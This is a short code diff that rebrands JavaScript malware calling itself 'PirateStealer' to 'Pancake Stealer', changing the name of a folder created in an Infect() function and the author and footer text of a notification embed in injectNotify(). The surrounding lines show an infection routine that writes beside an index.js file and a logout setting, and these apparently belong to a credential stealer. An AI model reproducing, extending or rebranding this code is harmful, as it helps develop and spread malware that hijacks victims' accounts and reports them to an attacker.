@@ -62,7 +62,7 @@ function Infect() {
                 }
                 if ( config.logout != "false" ) {
 
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    let folder = file.replace("index.js", "PancakeStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -174,10 +174,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "Pancake Stealer"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "Pancake Stealer"
             }
           }
         ]
